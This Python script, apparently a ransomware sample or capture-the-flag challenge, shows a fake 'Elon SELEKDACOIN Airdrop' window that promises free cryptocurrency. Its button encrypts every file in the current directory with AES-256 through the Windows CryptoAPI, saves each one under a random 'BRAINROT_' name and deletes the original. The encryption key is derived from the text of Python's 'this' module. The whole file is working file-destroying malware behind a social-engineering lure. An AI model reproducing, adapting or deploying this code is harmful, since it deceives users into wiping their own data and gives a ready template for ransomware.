import tkinter as tk
from tkinter import messagebox
from Crypto.Util.number import *
import ctypes
import ctypes.wintypes as wintypes
import sys
import os
import re
import hashlib
import this

advapi32 = ctypes.windll.advapi32
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

INVALID_HANDLE_VALUE = wintypes.HANDLE(-1).value
FILE_ATTRIBUTE_DIRECTORY = 0x10
PROV_RSA_AES = 24
CRYPT_VERIFYCONTEXT = 0xF0000000
CALG_AES_256 = 0x00006610
CRYPT_EXPORTABLE = 0x00000001
CALG_SHA_256 = 0x0000800c

class STRUCT_struct(ctypes.Structure):
	_fields_ = [
		("cbData", wintypes.DWORD),
		("pbData", ctypes.POINTER(ctypes.c_ubyte)),
	]

class WIN32_FIND_DATA(ctypes.Structure):
	_fields_ = [
		("dwFileAttributes", wintypes.DWORD),
		("ftCreationTime", wintypes.FILETIME),
		("ftLastAccessTime", wintypes.FILETIME),
		("ftLastWriteTime", wintypes.FILETIME),
		("nFileSizeHigh", wintypes.DWORD),
		("nFileSizeLow", wintypes.DWORD),
		("dwReserved0", wintypes.DWORD),
		("dwReserved1", wintypes.DWORD),
		("cFileName", wintypes.WCHAR * 260),
		("cAlternateFileName", wintypes.WCHAR * 14)
	]

def define__class(data):
	blob = STRUCT_struct()
	blob.cbData = len(data)
	blob.pbData = ctypes.cast(data, ctypes.POINTER(ctypes.c_ubyte))
	return blob

def BRAINROTTED(bbData):
	hProv = wintypes.HANDLE()
	if not advapi32.CryptAcquireContextW(
		ctypes.byref(hProv),
		None,
		None,
		PROV_RSA_AES,
		CRYPT_VERIFYCONTEXT
	):
		raise ctypes.WinError()

	hHash = wintypes.HANDLE()
	if not advapi32.CryptCreateHash(
		hProv,
		CALG_SHA_256,
		0,
		0,
		ctypes.byref(hHash)
	):
		advapi32.CryptReleaseContext(hProv, 0)
		raise ctypes.WinError()

	_hash = this.s.encode()
	if not advapi32.CryptHashData(
		hHash,
		_hash,
		len(_hash),
		0
	):
		advapi32.CryptDestroyHash(hHash)
		advapi32.CryptReleaseContext(hProv, 0)
		raise ctypes.WinError()

	hKey = wintypes.HANDLE()
	if not advapi32.CryptDeriveKey(
		hProv,
		CALG_AES_256,
		hHash,
		CRYPT_EXPORTABLE,
		ctypes.byref(hKey)
	):
		advapi32.CryptDestroyHash(hHash)
		advapi32.CryptReleaseContext(hProv, 0)
		raise ctypes.WinError()

	data_blob = define__class(bbData)

	data_len = wintypes.DWORD(len(bbData))
	buf_len = wintypes.DWORD(data_len.value + 16)
	encrypted_data = (ctypes.c_ubyte * buf_len.value)()
	ctypes.memmove(encrypted_data, bbData, data_len.value)

	if not advapi32.CryptEncrypt(
		hKey,
		0,
		True,
		0,
		encrypted_data,
		ctypes.byref(data_len),
		buf_len
	):
		advapi32.CryptDestroyKey(hKey)
		advapi32.CryptDestroyHash(hHash)
		advapi32.CryptReleaseContext(hProv, 0)
		raise ctypes.WinError()

	advapi32.CryptDestroyKey(hKey)
	advapi32.CryptDestroyHash(hHash)
	advapi32.CryptReleaseContext(hProv, 0)
	return bytes(encrypted_data[:data_len.value])

def lzf(directory):
    return [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f)) and f != 'thon.py']

# def lzf(directory):
#     return [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f)) and re.search("BRAINROT",f)]

def rfc(fPath):
    with open(fPath, 'rb') as file:
        return file.read()

def rename_file(file_path, new_name):
    new_path = os.path.join(os.path.dirname(file_path), new_name)
    os.rename(file_path, new_path)
    return new_path

def get_bitcoin():
	pDir = os.getcwd()
	for __fName in lzf(pDir):
		fPath = os.path.join(pDir, __fName)
		fCon = rfc(fPath)
		bf = BRAINROTTED(fCon)

		file_extension = os.path.splitext(__fName)[1]
		randhash = hashlib.md5(os.urandom(32)).hexdigest()
		n_fN = f"BRAINROT_{randhash}{file_extension}"
		with open(n_fN,"wb") as n:
			n.write(bf)
			n.close()
		os.remove(fPath)
	root.destroy()

root = tk.Tk()
root.title("😎 Elon SELEKDACOIN Airdrop 😎")
root.geometry("300x200")

label = tk.Label(root, text="Click only one and you'll get approximately 120.07392 SELEKDACOIN!", font=("Arial", 12))
label.pack(pady=20)
button = tk.Button(root, text="CLICK HERE BOI AKADEMI KERIPTO!", command=get_bitcoin)
button.pack(pady=10)

root.mainloop()